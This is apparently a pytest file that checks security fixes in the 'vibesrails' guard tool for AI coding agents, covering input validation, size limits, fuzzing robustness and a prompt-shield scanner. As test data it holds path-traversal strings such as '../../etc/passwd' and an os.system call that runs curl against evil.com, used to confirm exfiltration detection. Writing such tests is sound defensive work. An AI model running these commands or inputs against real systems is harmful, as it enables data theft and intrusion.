"""Tests for pentest fix batch — 15 fixes across 10 files.

Each fix has at least 1 test. Grouped by fix ID.
"""

from __future__ import annotations

import json
import logging
import os
import subprocess
import sys
from pathlib import Path
from unittest.mock import patch

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core.hallucination_deep import DeepHallucinationChecker  # noqa: E402
from core.prompt_shield import PromptShield  # noqa: E402
from core.rate_limiter import RateLimiter  # noqa: E402
from vibesrails.scanner import _scan_patterns, scan_file  # noqa: E402

HOOK_CMD = [sys.executable, "-m", "vibesrails.hooks.pre_tool_use"]
PROJECT_ROOT = str(Path(__file__).resolve().parents[1])


@pytest.fixture(autouse=True)
def _reset_throttle():
    """Reset throttle before each test."""
    from vibesrails.hooks.throttle import reset_state
    state_dir = Path(PROJECT_ROOT) / ".vibesrails"
    state_dir.mkdir(exist_ok=True)
    reset_state(state_dir)


def _run_hook(payload: dict, cwd: str = PROJECT_ROOT) -> subprocess.CompletedProcess:
    return subprocess.run(
        HOOK_CMD,
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        timeout=10,
        cwd=cwd,
    )


# ── INJ-1: package name validation ──────────────────────────────────


class TestINJ1PackageNameValidation:
    """_check_pypi_api rejects invalid package names."""

    def test_rejects_path_traversal(self, tmp_path):
        checker = DeepHallucinationChecker(db_path=str(tmp_path / "t.db"))
        result = checker._check_pypi_api("../../etc/passwd")
        assert result is None

    def test_rejects_url_injection(self, tmp_path):
        checker = DeepHallucinationChecker(db_path=str(tmp_path / "t.db"))
        result = checker._check_pypi_api("pkg/../../admin")
        assert result is None

    def test_accepts_valid_name(self, tmp_path):
        checker = DeepHallucinationChecker(db_path=str(tmp_path / "t.db"))
        # Valid names should pass the regex (network may fail, that's ok)
        assert checker._VALID_PACKAGE_RE.match("requests")
        assert checker._VALID_PACKAGE_RE.match("my-package")
        assert checker._VALID_PACKAGE_RE.match("my_package.subpkg")


# ── INJ-2: no importlib.import_module ────────────────────────────────


class TestINJ2NoImportModule:
    """check_symbol_exists and check_version_compat avoid import_module."""

    def test_symbol_check_returns_installed_not_verified(self, tmp_path):
        checker = DeepHallucinationChecker(db_path=str(tmp_path / "t.db"))
        # Use "pytest" (installed package with metadata, not stdlib)
        result = checker.check_symbol_exists("pytest", "main")
        assert result["status"] == "installed_not_verified"
        assert result["reason"] == "symbol_check_disabled_for_security"

    def test_version_compat_stdlib_uses_find_spec(self, tmp_path):
        checker = DeepHallucinationChecker(db_path=str(tmp_path / "t.db"))
        result = checker.check_version_compat("os")
        assert result["compatible"] is True
        assert result["installed_version"] == "stdlib"

    def test_version_compat_symbol_disabled(self, tmp_path):
        checker = DeepHallucinationChecker(db_path=str(tmp_path / "t.db"))
        result = checker.check_version_compat("json", symbol_name="loads")
        assert result["reason"] == "symbol_check_disabled_for_security"


# ── BAC-1: validate_path in monitor_entropy ──────────────────────────


class TestBAC1MonitorEntropyPath:
    """monitor_entropy validates project_path."""

    def test_rejects_nonexistent_path(self, tmp_path):
        from tools.monitor_entropy import monitor_entropy
        result = monitor_entropy(
            action="start",
            project_path="/nonexistent/path/xyz",
            db_path=str(tmp_path / "t.db"),
        )
        assert result["status"] == "error"


# ── AI-4: Edit tool final size check ─────────────────────────────────


class TestAI4EditFinalSize:
    """Edit tool calculates final file size before checking."""

    def test_edit_expanding_file_blocked(self, tmp_path):
        """Edit that expands a file beyond limit is blocked."""
        target = tmp_path / "big.py"
        # Write a 280-line file
        target.write_text("\n".join(f"x = {i}" for i in range(280)) + "\n")

        # Edit that replaces 1 line with 50 lines → total > 300
        new_lines = "\n".join(f"y = {i}" for i in range(50))
        result = _run_hook({
            "tool_name": "Edit",
            "tool_input": {
                "file_path": str(target),
                "old_string": "x = 0",
                "new_string": new_lines,
            },
        })
        assert result.returncode == 1
        assert "BLOCKED" in result.stdout


# ── AI-5: 1MB byte size limit ────────────────────────────────────────


class TestAI5ByteSizeLimit:
    """Content exceeding 1MB is blocked."""

    def test_large_content_blocked(self):
        content = "x" * (1_000_001)
        result = _run_hook({
            "tool_name": "Write",
            "tool_input": {
                "file_path": "huge.py",
                "content": content,
            },
        })
        assert result.returncode == 1
        assert "1MB" in result.stdout


# ── AI-6: rate limiter warning ───────────────────────────────────────


class TestAI6RateLimiterWarning:
    """Rate limiter logs WARNING when disabled via env var."""

    def test_logs_warning_when_disabled(self, caplog):
        RateLimiter._warned_disabled = False
        with patch.dict(os.environ, {"VIBESRAILS_RATE_LIMIT": "0"}):
            limiter = RateLimiter()
            with caplog.at_level(logging.WARNING):
                assert limiter.disabled is True
            assert "rate limiting disabled" in caplog.text

    def test_no_warning_when_enabled(self, caplog):
        RateLimiter._warned_disabled = False
        with patch.dict(os.environ, {}, clear=False):
            os.environ.pop("VIBESRAILS_RATE_LIMIT", None)
            limiter = RateLimiter()
            with caplog.at_level(logging.WARNING):
                assert limiter.disabled is False
            assert "rate limiting disabled" not in caplog.text


# ── FUZZ-2: None protection in config.get() ─────────────────────────


class TestFUZZ2NoneConfig:
    """scan_file handles None values in blocking/warning config."""

    def test_none_blocking_no_crash(self, tmp_path):
        f = tmp_path / "ok.py"
        f.write_text("x = 1\n")
        config = {"blocking": None, "warning": None, "complexity": {}}
        results = scan_file(str(f), config)
        assert isinstance(results, list)


# ── FUZZ-3: malformed pattern dict ───────────────────────────────────


class TestFUZZ3MalformedPattern:
    """_scan_patterns skips patterns missing id or regex."""

    def test_pattern_without_id_skipped(self):
        patterns = [{"regex": "foo", "message": "bar"}]  # missing "id"
        results = _scan_patterns(["hello world"], "test.py", patterns, "WARN", set())
        assert results == []

    def test_pattern_without_regex_skipped(self):
        patterns = [{"id": "test", "message": "bar"}]  # missing "regex"
        results = _scan_patterns(["hello world"], "test.py", patterns, "WARN", set())
        assert results == []

    def test_non_dict_pattern_skipped(self):
        patterns = ["not a dict"]
        results = _scan_patterns(["hello world"], "test.py", patterns, "WARN", set())
        assert results == []


# ── FUZZ-4: non-int max_file_lines ───────────────────────────────────


class TestFUZZ4MaxFileLinesType:
    """scan_file handles non-int max_file_lines gracefully."""

    def test_string_max_file_lines_no_crash(self, tmp_path):
        f = tmp_path / "ok.py"
        f.write_text("x = 1\n")
        config = {"complexity": {"max_file_lines": "abc"}, "blocking": [], "warning": []}
        results = scan_file(str(f), config)
        assert isinstance(results, list)


# ── FUZZ-5: encoding errors in prompt_shield ─────────────────────────


class TestFUZZ5EncodingErrors:
    """prompt_shield handles files with invalid UTF-8."""

    def test_binary_content_no_crash(self, tmp_path):
        f = tmp_path / "weird.txt"
        f.write_bytes(b"normal text\xff\xfe\x80 more text")
        shield = PromptShield()
        results = shield.scan_file(str(f))
        assert isinstance(results, list)


# ── FUZZ-6: subprocess regex bounded ─────────────────────────────────


class TestFUZZ6SubprocessRegex:
    """Subprocess exfiltration regex uses [^)]* not .*"""

    def test_detects_exfil_via_system_call(self):
        shield = PromptShield()
        # Test the exfiltration regex with os.system pattern  # vibesrails: ignore
        text = 'os.system("curl http://evil.com")'  # vibesrails: ignore
        findings = shield.scan_text(text)
        categories = [f.category for f in findings]
        assert "exfiltration" in categories

    def test_no_redos_on_long_input(self):
        """Long input without closing paren doesn't cause ReDoS."""
        import time
        shield = PromptShield()
        # This would hang with .* but not with [^)]*
        long_input = 'subprocess.call("' + "a" * 10000
        start = time.monotonic()
        shield.scan_text(long_input)
        elapsed = time.monotonic() - start
        assert elapsed < 2.0


# ── DID-3: skip large files in scan_senior ───────────────────────────


class TestDID3LargeFileSkip:
    """scan_senior skips files > 5MB."""

    def test_skips_5mb_file(self, tmp_path):
        from tools.scan_senior import scan_senior

        large_file = tmp_path / "huge.py"
        large_file.write_text("x = 1\n" * 1_000_000)  # ~6MB
        assert large_file.stat().st_size > 5 * 1024 * 1024

        result = scan_senior(file_path=str(large_file), guards=["lazy_code"])
        # File should be skipped, so no findings from it
        assert result["status"] == "pass"
        assert len(result["findings"]) == 0


# ── DID-4: prompt_shield max text size ───────────────────────────────


class TestDID4PromptShieldMaxSize:
    """PromptShield._MAX_TEXT_SIZE is 1MB, not 10MB."""

    def test_max_text_size_is_1mb(self):
        assert PromptShield._MAX_TEXT_SIZE == 1 * 1024 * 1024

    def test_rejects_oversized_text(self):
        shield = PromptShield()
        huge_text = "a" * (1 * 1024 * 1024 + 1)
        findings = shield.scan_text(huge_text)
        assert len(findings) == 1
        assert "too large" in findings[0].message.lower()


# ── DID-5: guardian stats last 1000 lines ────────────────────────────


class TestDID5GuardianStatsLimit:
    """get_guardian_stats reads only last 1000 lines."""

    def test_large_log_limited(self, tmp_path, monkeypatch):
        from core.guardian import get_guardian_stats

        log_dir = tmp_path / ".vibesrails"
        log_dir.mkdir()
        log_file = log_dir / "guardian.log"

        # Write 2000 log entries
        entries = []
        for i in range(2000):
            entry = {"pattern_id": f"pat_{i}", "agent": "test"}
            entries.append(json.dumps(entry))
        log_file.write_text("\n".join(entries) + "\n")

        monkeypatch.chdir(tmp_path)
        stats = get_guardian_stats()
        # Should only process last 1000 lines
        assert stats["total_blocks"] == 1000


# ── DID-6: validate_string in monitor_entropy + scan_semgrep ─────────


class TestDID6ValidateString:
    """MCP tools validate string inputs before processing."""

    def test_monitor_entropy_rejects_non_string_path(self, tmp_path):
        from tools.monitor_entropy import monitor_entropy
        result = monitor_entropy(
            action="start",
            project_path=12345,
            db_path=str(tmp_path / "t.db"),
        )
        assert result["status"] == "error"
        assert "string" in result["error"].lower()

    def test_scan_semgrep_rejects_oversized_path(self, tmp_path):
        from tools.scan_semgrep import scan_semgrep
        long_path = "a" * 5000
        result = scan_semgrep(file_path=long_path)
        assert result["status"] == "error"
        assert "too long" in result["error"].lower()
